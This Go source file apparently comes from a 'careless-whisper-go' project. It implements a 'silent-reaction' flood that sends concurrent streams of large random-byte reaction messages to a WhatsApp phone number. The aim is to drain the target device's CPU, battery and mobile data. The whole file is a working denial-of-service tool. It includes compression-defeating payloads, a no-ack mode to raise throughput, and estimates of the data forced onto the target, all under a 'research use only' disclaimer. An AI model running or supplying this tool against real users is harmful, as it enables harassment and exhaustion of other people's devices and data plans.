// Package flood implements the silent-reaction denial-of-service flood.
//
// RESEARCH USE ONLY. The flood sends a sustained, high-concurrency stream of
// oversized silent reaction messages to a target number, forcing the target
// device to download and decrypt large volumes of data and so draining its
// CPU, battery, and mobile data. Only run it against devices and accounts you
// own or are explicitly authorised to test.
package flood

import (
	"context"
	"crypto/rand"
	"errors"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ctrlsam/careless-whisper-go/internal/messenger"
)

const bytesPerGiB = 1 << 30

// DefaultPayloadSize is the per-message reaction payload (1 MiB).
const DefaultPayloadSize = 1 << 20

// likelyRejectedPayloadBytes is the point past which a reaction payload is
// likely to exceed WhatsApp's accepted message size and be rejected
// server-side. It is a heuristic for warning, not a hard protocol limit.
const likelyRejectedPayloadBytes = 64 << 10

// errorBackoff is the pause after a non-fatal send error, so a persistent
// failure (for example a dropped socket) backs off instead of hot-spinning.
const errorBackoff = 250 * time.Millisecond

// Settings configures a flood run.
type Settings struct {
	PhoneNumber        string
	ConcurrentWorkers  int
	DelayBetween       time.Duration
	Duration           time.Duration // zero means run until the context is cancelled
	MaxMessages        int           // zero means unlimited
	PayloadSize        int
	ReportInterval     time.Duration
	IgnoreUnregistered bool
	// NoAck skips waiting for the per-message server ack, raising throughput.
	NoAck bool
}

func (s Settings) withDefaults() Settings {
	if s.ConcurrentWorkers <= 0 {
		s.ConcurrentWorkers = 10
	}
	if s.PayloadSize <= 0 {
		s.PayloadSize = DefaultPayloadSize
	}
	if s.ReportInterval <= 0 {
		s.ReportInterval = 5 * time.Second
	}
	return s
}

// Stats holds running totals for an in-progress or completed flood.
type Stats struct {
	Sent      int64
	Failed    int64
	StartedAt time.Time
	Elapsed   time.Duration
	// Acked is true when sends waited for the server acknowledgement, so Sent
	// counts server-accepted messages. When false (--no-ack) Sent counts socket
	// writes the server may still reject, so the data figure is only a loose
	// upper bound.
	Acked bool
}

// Rate returns messages sent per second over the elapsed window.
func (s Stats) Rate() float64 {
	seconds := s.Elapsed.Seconds()
	if seconds <= 0 {
		return 0
	}
	return float64(s.Sent) / seconds
}

// EstimatedGiB is an upper bound on the data the target was forced to handle:
// Sent times the payload size. It overstates the real figure by whatever share
// of sends the server rejected or never delivered, and (with --no-ack) by the
// rejected sends that were still counted as Sent. It is not a measurement.
func (s Stats) EstimatedGiB(payloadSize int) float64 {
	return float64(s.Sent*int64(payloadSize)) / bytesPerGiB
}

// BuildPayload returns a reaction string of the requested byte size filled with
// random printable ASCII. Random (rather than repeated) bytes mean the payload
// cannot be shrunk by any compression applied before encryption, so a delivered
// message's on-wire size matches its length.
func BuildPayload(size int) (string, error) {
	if size <= 0 {
		return "", errors.New("payload size must be positive")
	}
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	buf := make([]byte, size)
	if _, err := rand.Read(buf); err != nil {
		return "", fmt.Errorf("generate payload: %w", err)
	}
	for i, b := range buf {
		buf[i] = charset[int(b)%len(charset)]
	}
	return string(buf), nil
}

// Reporter receives progress and lifecycle messages during a flood.
type Reporter interface {
	Progress(stats Stats, payloadSize int)
	Warn(string)
	Info(string)
}

// Run floods the target until a stop condition is reached or ctx is cancelled.
func Run(ctx context.Context, m messenger.Messenger, settings Settings, reporter Reporter) (Stats, error) {
	settings = settings.withDefaults()

	warn := func(string) {}
	if reporter != nil {
		warn = reporter.Warn
	}
	if err := messenger.ConfirmNumber(ctx, m, settings.PhoneNumber, settings.IgnoreUnregistered, warn); err != nil {
		return Stats{}, err
	}

	payload, err := BuildPayload(settings.PayloadSize)
	if err != nil {
		return Stats{}, err
	}
	if settings.PayloadSize > likelyRejectedPayloadBytes {
		msg := fmt.Sprintf("payload-size %d B likely exceeds WhatsApp's accepted message size (~%d B); oversized reactions are usually rejected server-side, so most sends will not reach the target", settings.PayloadSize, likelyRejectedPayloadBytes)
		if settings.NoAck {
			msg += "; --no-ack counts those rejected sends as sent, inflating the data estimate"
		}
		warn(msg)
	}

	runCtx, cancel := context.WithCancel(ctx)
	defer cancel()
	if settings.Duration > 0 {
		var timeoutCancel context.CancelFunc
		runCtx, timeoutCancel = context.WithTimeout(runCtx, settings.Duration)
		defer timeoutCancel()
	}

	var sent, failed int64
	started := time.Now()

	// A lost session (logout/unlink) is fatal and non-retryable: capture it
	// once, stop every worker, and surface it so the run ends cleanly instead
	// of spinning on a dead socket.
	var fatalOnce sync.Once
	var fatalErr error
	setFatal := func(err error) {
		fatalOnce.Do(func() {
			fatalErr = fmt.Errorf("flood stopped: %w", err)
			cancel()
		})
	}

	shouldContinue := func() bool {
		if settings.MaxMessages > 0 && atomic.LoadInt64(&sent) >= int64(settings.MaxMessages) {
			return false
		}
		return runCtx.Err() == nil
	}

	var wg sync.WaitGroup
	sendOpts := messenger.SendOptions{NoAck: settings.NoAck}
	worker := func() {
		defer wg.Done()
		for shouldContinue() {
			if _, err := m.SendSilentMessage(runCtx, settings.PhoneNumber, payload, sendOpts); err != nil {
				if runCtx.Err() != nil {
					return
				}
				atomic.AddInt64(&failed, 1)
				if errors.Is(err, messenger.ErrSessionLost) {
					setFatal(err)
					return
				}
				// Non-fatal error: back off so a persistent failure does not
				// hot-spin the worker.
				select {
				case <-runCtx.Done():
					return
				case <-time.After(errorBackoff):
				}
				continue
			}
			atomic.AddInt64(&sent, 1)
			if settings.DelayBetween > 0 {
				select {
				case <-runCtx.Done():
					return
				case <-time.After(settings.DelayBetween):
				}
			}
		}
	}

	snapshot := func() Stats {
		return Stats{
			Sent:      atomic.LoadInt64(&sent),
			Failed:    atomic.LoadInt64(&failed),
			StartedAt: started,
			Elapsed:   time.Since(started),
			Acked:     !settings.NoAck,
		}
	}

	reportDone := make(chan struct{})
	if reporter != nil {
		go func() {
			ticker := time.NewTicker(settings.ReportInterval)
			defer ticker.Stop()
			for {
				select {
				case <-runCtx.Done():
					return
				case <-reportDone:
					return
				case <-ticker.C:
					reporter.Progress(snapshot(), settings.PayloadSize)
				}
			}
		}()
	}

	for i := 0; i < settings.ConcurrentWorkers; i++ {
		wg.Add(1)
		go worker()
	}
	wg.Wait()
	close(reportDone)

	final := snapshot()
	if reporter != nil {
		reporter.Progress(final, settings.PayloadSize)
	}
	return final, fatalErr
}
